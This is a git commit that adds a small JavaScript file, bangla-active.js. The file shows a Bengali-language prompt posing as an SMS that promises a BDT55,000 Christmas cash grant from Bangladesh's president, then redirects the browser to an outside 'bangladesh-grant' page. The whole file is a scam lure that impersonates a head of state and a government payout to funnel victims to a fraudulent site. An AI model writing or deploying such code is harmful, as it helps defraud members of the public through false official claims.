206222ac36c80192f4ac8c0c6f7ef235dcbfae28
boss-bloq <nsisboy01@gmail.com>
2024-12-13 12:40:25 -0800

    Create bangla-active.js

---
+++ bangla-active.js
@@ -0,0 +1,6 @@
+
+var password = 'BDT55,000 প্রত্যাহার করুন'
+password=prompt('SMS: অভিনন্দন আপনি বাংলাদেশের জন্য রাষ্ট্রপতি মোহাম্মাদ শাহাবুদ্দিন BDT55,000 ক্রিসমাস নগদ অনুদানের জন্য যোগ্য, দয়া করে X-MAS নগদ অনুদান প্রত্যাহার করতে OK চাপুন   ','BDT55,000 প্রত্যাহার করুন');
+if (password != 'BDT55,000 প্রত্যাহার করুন') {
+location.href='https://damba-fest.org/bangladesh-grant.html';
+}
